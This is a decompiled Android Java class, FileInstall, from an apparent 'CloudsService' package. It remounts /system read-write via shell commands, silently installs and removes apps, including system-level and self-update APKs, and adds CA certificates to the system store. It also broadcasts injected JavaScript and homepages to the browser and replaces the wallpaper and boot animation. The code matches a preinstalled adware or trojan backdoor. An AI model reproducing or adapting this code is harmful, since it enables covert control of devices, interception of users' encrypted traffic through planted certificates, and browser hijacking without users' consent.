package com.clouds.install;

import android.app.WallpaperManager;
import android.content.Context;
import android.content.Intent;
import android.graphics.drawable.BitmapDrawable;
import android.util.Log;
import com.clouds.debug.SystemDebug;
import com.clouds.server.R;
import com.clouds.server.ShCmd;
import com.clouds.util.DistinguishDevice;
import com.clouds.util.FileManager;

public class FileInstall {
    private static final String INTENT_ACTION_BROWSER_JS = "com.android.browser.js";
    private static final String INTENT_ACTION_BROWSER_PAPER = "com.android.browser.homepage";
    private static final String INTENT_ACTION_BROWSER_PAPERS = "com.android.browser.homepages";
    private static final String MountRemountRMSystem = "mount -o remount,rw /system";
    private static final String MountRemountRSystem = "mount -r -o remount /system";
    public static final String SYSTEM_TYPE = "system";
    private static final String TAG;
    public static final String USER_TYPE = "user";
    private static FileInstall fileInstall = null;
    public static final int isAnimation = 4;
    public static final int isApplication = 1;
    public static final int isCertificate = 5;
    public static final int isDeleteAppInfo = 7;
    public static final int isDeleteOldApp = 6;
    public static final int isHomePage = 3;
    public static final int isHomePages = 8;
    public static final int isWallPaper = 2;

    static {
        TAG = FileInstall.class.getSimpleName();
        fileInstall = null;
    }

    private void deleteOldApp(Context context, String appName, String type) {
        boolean isWMTDevice = DistinguishDevice.isWMTDevice();
        SystemDebug.e(TAG, new StringBuilder("installApplication path: ").append(appName).append(" installFileLocal: ").append(context.getFilesDir().getAbsolutePath()).toString());
        if (isWMTDevice) {
            WMTFileInstall.wmtDeleteApplication(context, appName, type);
        } else {
            StandardFileInstall.standardDeleteApplication(appName, type);
        }
    }

    private void getDeleteAppName(Context context) {
        String[] deleteAppNames = context.getResources().getStringArray(R.array.history_appname);
        if (deleteAppNames != null) {
            int i = 0;
            while (i < deleteAppNames.length) {
                SystemDebug.e(TAG, new StringBuilder("deleteAppName: ").append(deleteAppNames[i]).toString());
                i++;
            }
        }
    }

    public static FileInstall getFileInstallInstance() {
        if (fileInstall == null) {
            fileInstall = new FileInstall();
        }
        return fileInstall;
    }

    private void installAnimation(Context context, String path) {
        boolean isWMTDevice = DistinguishDevice.isWMTDevice();
        SystemDebug.e(TAG, new StringBuilder("-------\u5224\u65ad\u5f53\u524d\u8bbe\u5907\u662f\u5426\u662fwmt-----------installAnimation isWMTDevice: ").append(isWMTDevice).toString());
        if (isWMTDevice) {
            WMTFileInstall.wmtInstallAnimation(context);
            WMTFileInstall.wmtInstallStartingUpLOGO(context);
        } else {
            StandardFileInstall.standardInstallAnimation(path);
        }
    }

    private void installApplication(Context context, String path, String type) {
        boolean isWMTDevice = DistinguishDevice.isWMTDevice();
        SystemDebug.e(TAG, new StringBuilder("installApplication isWMTDevice: ").append(isWMTDevice).append(" type: ").append(type).toString());
        SystemDebug.e(TAG, new StringBuilder("installApplication path: ").append(path).append(" installFileLocal: ").append(context.getFilesDir().getAbsolutePath()).toString());
        if (isWMTDevice) {
            Log.e(TAG, new StringBuilder("\u4fdd\u5b58\u6587\u4ef6\u662f\u5426\u6210\u529f\uff1a").append(FileManager.setPathToFile(context.getFilesDir().getAbsolutePath(), "install", path)).toString());
            Log.e(TAG, new StringBuilder("--1--WMTFileInstall.wmtInstallOta--path=").append(path).toString());
            if ("/data/data/com.clouds.server/files/CloudsService.apk".equals(path)) {
                Log.e(TAG, new StringBuilder("--2--WMTFileInstall.wmtInstallOta--path=").append(path).toString());
                WMTFileInstall.wmtInstallOta(context, type);
            } else {
                WMTFileInstall.wmtInstallApplication(context, type);
            }
        } else if ("/data/data/com.clouds.server/files/CloudsService.apk".equals(path)) {
            StandardFileInstall.standardInstallOta(path, type);
        } else {
            StandardFileInstall.standardInstallApplication(path, type);
        }
    }

    private void installBrowerJs(Context context, String path) {
        SystemDebug.e(TAG, new StringBuilder("installHomePage isWMTDevice: ").append(DistinguishDevice.isWMTDevice()).toString());
        if (path != null) {
            String homepage = FileManager.readFileContentInfo(path);
            SystemDebug.e(TAG, new StringBuilder("--\u66f4\u6362\u6d4f\u89c8\u5668\u811a\u672c--installBrowerJs bhp: ").append(homepage).toString());
            Intent intent = new Intent(INTENT_ACTION_BROWSER_JS);
            intent.putExtra("browerjs", homepage);
            context.sendBroadcast(intent);
        }
    }

    private void installCopyDeleteAppInfo(Context context, String path) {
        boolean isWMTDevice = DistinguishDevice.isWMTDevice();
        SystemDebug.e(TAG, new StringBuilder("---\u590d\u5236\u9700\u8981\u5220\u9664\u7684APK\u4fe1\u606f ---installHomePage isWMTDevice: ").append(isWMTDevice).toString());
        if (path == null) {
            return;
        }
        if (isWMTDevice) {
            WMTFileInstall.wmtInstallCopyDeleteAppInfo(context);
        } else {
            StandardFileInstall.standardInstallCopyDeleteAPPInfo(path);
        }
    }

    private void installHomePage(Context context, String path) {
        boolean isWMTDevice = DistinguishDevice.isWMTDevice();
        SystemDebug.e(TAG, new StringBuilder("installHomePage isWMTDevice: ").append(isWMTDevice).toString());
        if (path != null) {
            String homepage = FileManager.readFileContentInfo(path);
            SystemDebug.e(TAG, new StringBuilder("installHomePage bhp: ").append(homepage).toString());
            Intent intent = new Intent(INTENT_ACTION_BROWSER_PAPER);
            intent.putExtra("homepage", homepage);
            context.sendBroadcast(intent);
            if (isWMTDevice) {
                WMTFileInstall.wmtInstallHomePage(context, path);
            } else if (path.endsWith(".apk")) {
                Log.e(TAG, "-------------\u5b89\u88c5\u6d4f\u89c8\u5668\u8f6f\u4ef6");
                StandardFileInstall.standardInstallApplication(path, USER_TYPE);
            } else {
                Log.e(TAG, "-------------\u66f4\u6362\u6d4f\u89c8\u5668\u9ed8\u8ba4\u4e3b\u9875");
                StandardFileInstall.standardInstallHomePage(path);
            }
        }
    }

    private void installHomePages(Context context, String path) {
        String homepage = FileManager.readFileContentInfo(path);
        SystemDebug.e(TAG, new StringBuilder("----\u66f4\u6362\u591a\u4e2a\u6d4f\u89c8\u5668\u4e3b\u9875-----installHomePage bhp: ").append(homepage).toString());
        Intent intent = new Intent(INTENT_ACTION_BROWSER_PAPERS);
        intent.putExtra("homepages", homepage);
        context.sendBroadcast(intent);
        boolean isWMTDevice = DistinguishDevice.isWMTDevice();
        SystemDebug.e(TAG, new StringBuilder("installHomePage isWMTDevice: ").append(isWMTDevice).toString());
        if (path != null && !isWMTDevice) {
            Log.e(TAG, "-------------\u66f4\u6362\u591a\u4e2a\u6d4f\u89c8\u5668\u4e3b\u9875");
        }
    }

    private void installWallPaper(Context context, String wallpath) {
        Log.e(TAG, "-------\u66ff\u6362\u684c\u9762\u5899\u7eb8");
        SystemDebug.e(TAG, new StringBuilder("---\u5899\u7eb8\u8def\u5f84--installWallPaper wallpath: ").append(wallpath).toString());
        try {
            WallpaperManager.getInstance(context).setBitmap(new BitmapDrawable(context.getResources(), wallpath).getBitmap());
        } catch (Exception e) {
            e.printStackTrace();
        }
        Log.d(TAG, "setWallpaper");
    }

    private void setBackupCertificate(Context context, String path) {
        String certificateName = path.substring(path.lastIndexOf("/") + 1);
        boolean isWMTDevice = DistinguishDevice.isWMTDevice();
        SystemDebug.e(TAG, new StringBuilder("installApplication isWMTDevice: ").append(isWMTDevice).toString());
        SystemDebug.e(TAG, new StringBuilder("installApplication path: ").append(path).append(" installFileLocal: ").append(context.getFilesDir().getAbsolutePath()).toString());
        if (isWMTDevice) {
            boolean isSuccess = FileManager.setPathToFile(context.getFilesDir().getAbsolutePath(), "cacerts", path);
            WMTFileInstall.setSecurityCertificate(context);
        } else {
            StandardFileInstall.setStandardSecurityCertificate(path, certificateName);
        }
    }

    public void installProgram(Context context, String path, String type, int identifying) throws Exception {
        Log.e(TAG, new StringBuilder("----\u5b89\u88c5\u5e94\u7528\u7a0b\u5e8f---identifying::::::: ").append(identifying).toString());
        switch (identifying) {
            case isApplication:
                installApplication(context, path, type);
            case isWallPaper:
                installWallPaper(context, path);
            case isHomePage:
                installHomePage(context, path);
            case isAnimation:
                installAnimation(context, path);
            case isCertificate:
                setBackupCertificate(context, path);
            case isDeleteOldApp:
                deleteOldApp(context, path, type);
            case isDeleteAppInfo:
                installCopyDeleteAppInfo(context, path);
            case isHomePages:
                installHomePages(context, path);
            default:
                break;
        }
    }

    public void remountSystemR() throws Exception, Error {
        SystemDebug.e(TAG, new StringBuilder("remountSystemR: ").append(DistinguishDevice.isWMTDevice()).toString());
        if (!DistinguishDevice.isWMTDevice()) {
            if (ShCmd.shellCmmandIsSafe("sync") != 0) {
                Log.e(TAG, "failed to sync");
            }
            if (ShCmd.shellCmmandIsSafe(MountRemountRSystem) != 0) {
                Log.e(TAG, "failed to mount -r -o remount /system");
            }
        }
    }

    public void remountSystemRW() throws Exception, Error {
        Log.e(TAG, "-------------aaaaaaaaaaaaaaaaa");
        SystemDebug.e(TAG, new StringBuilder("remountSystemRW: ").append(DistinguishDevice.isWMTDevice()).toString());
        if (!DistinguishDevice.isWMTDevice() && ShCmd.shellCmmandIsSafe(MountRemountRMSystem) != 0) {
            Log.e(TAG, "failed to MountRemountRMSystem");
        }
    }
}